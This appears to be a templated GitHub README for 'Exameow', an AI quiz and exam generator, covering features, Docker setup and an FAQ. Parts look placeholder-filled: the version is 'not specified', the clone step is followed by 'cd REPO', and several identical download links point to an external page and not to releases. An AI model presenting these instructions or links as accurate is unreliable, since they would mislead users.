# Exameow - AI Exam Question Generator 2026

> **Exameow is a local-first, cross-platform AI tool for converting learning resources into quizzes and study sessions. The current release version is not specified.**

[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliver-huber68/exameow-ai-quiz-builder?style=flat-square)](https://github.com/oliver-huber68/exameow-ai-quiz-builder)

---

<p align="center">
  <a href="https://oliver-huber68.github.io/exameow-ai-quiz-builder/">
    <img src="https://img.shields.io/badge/Download-Exameow%20Latest-brightgreen?style=for-the-badge" alt="Download Exameow">
  </a>
</p>

> **[Download Exameow Directly](https://oliver-huber68.github.io/exameow-ai-quiz-builder/)**

---

[Download Latest Build](https://oliver-huber68.github.io/exameow-ai-quiz-builder/)

---

## What Exameow Does

Exameow turns material that students and educators already have into reusable practice content. Feed it PDFs, office documents, presentations, images, or plain text, then generate multiple-choice, true/false, fill-in-the-blank, or short-answer questions.

Beyond question creation, the app includes several ways to study: mock tests, flashcards, ordered review, random exercises, and dedicated practice for previously missed questions. Online exams can be published with shareable codes and timed sessions. Local storage, Docker-based self-hosting, offline-oriented use, and encrypted API key management provide additional control over how the application is operated.

---

## Capabilities

- Build question sets from PDFs, documents, slide presentations, images, and text
- Produce multiple-choice, true/false, fill-in-the-blank, and short-answer questions
- Study through sequential review, random practice, mock exams, flashcards, or wrong-answer sessions
- Publish exams online with access codes that can be shared and optional timed sessions
- Monitor published exam activity from a teacher dashboard
- Evaluate short-answer submissions with AI grading
- Find questions in local banks using OCR, camera input, or screen capture
- Move question banks between systems with XLSX and CSV import/export
- Deploy Exameow in Docker for self-hosted use
- Keep application data locally while protecting API keys with encryption
- Run Exameow on Windows, macOS, Linux, Android, and the Web

---

## Getting Started

### Download and launch

Get the most recent build for your platform here:

[Download Exameow](https://oliver-huber68.github.io/exameow-ai-quiz-builder/)

Open the downloaded application and complete the setup steps for your operating system. If you plan to generate questions or grade answers with AI, configure an OpenAI-compatible API connection during the initial setup.

### Docker deployment

Use the following commands to retrieve the repository and start the container deployment:

```bash
git clone https://github.com/oliver-huber68/exameow-ai-quiz-builder.git
cd REPO
docker compose up -d
```

Visit the address supplied by the running deployment, then finish the first-time configuration.

---

## Using Exameow

The basic process is:

1. Start Exameow in the desktop, mobile, browser, or self-hosted version.
2. Provide a PDF, document, presentation, image, or text excerpt.
3. Choose the question styles and generation settings you want to use.
4. Inspect the resulting questions and store them in the local question bank.
5. Open a study workflow, such as flashcards, a mock exam, random practice, or review of incorrect answers.
6. Export the bank as XLSX or CSV if you need to use it elsewhere.
7. Publish an online exam to obtain a shareable code and, if desired, add a time limit.

When using short-answer questions, turn on AI grading to receive an assessment after submitting the responses.

---

## Settings and Data

Exameow is built to keep its data local. The main configuration areas are:

```text
AI provider: OpenAI-compatible API
API key: Encrypted by the application
Question bank: Stored locally
Deployment: Desktop, web, or Docker
```

API credentials should remain restricted to the installation that uses them. If you deploy with Docker, inspect the project configuration and container settings before making the service available to other devices.

---

## System Requirements

- One supported environment: Windows, macOS, Linux, Android, or Web
- An OpenAI-compatible API connection for AI generation and grading features
- Enough storage for imported study resources and locally saved question banks
- Docker when running a containerized self-hosted installation
- A modern web environment for browser access
- Appropriate image or capture input for OCR and image-search features

The exact availability of offline and local-first workflows depends on the selected build and on whether an AI provider connection has been configured.

---

## Frequently Asked Questions

### What kind of users can benefit from Exameow?

Exameow is designed for students, teachers, educators, and other learners who want to turn existing study resources into organized practice material.

### Does Exameow accept personal study files?

Yes. PDFs, documents, slide decks, images, and text can all be supplied as source material for generated questions.

### What question formats can it create?

Exameow supports multiple-choice, true/false, fill-in-the-blank, and short-answer formats.

### Is a hosted service required?

No. The application supports local-first operation and Docker-based self-hosting. AI-powered functions can still depend on an OpenAI-compatible API being configured.

### How are question banks saved?

Question banks are intended to remain in local storage. You can also import or export them in XLSX and CSV format.

### How is the AI provider connected?

In the application settings, or in the configuration for a self-hosted installation, enter an OpenAI-compatible API endpoint and key. Exameow handles API keys with encryption.

### What should I check if generation or grading does not work?

Verify the API connection, confirm that the key is valid, and make sure the deployment can contact the configured provider. Also check that the uploaded material can be read and includes usable content.

### How can I distribute an exam to other people?

Publish the exam through the online exam workflow. This creates a shareable code, while timed sessions and associated activity are handled from the teacher dashboard.

### How do I install a newer build?

Follow the latest build link, or pull the latest repository changes before rebuilding a Docker installation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
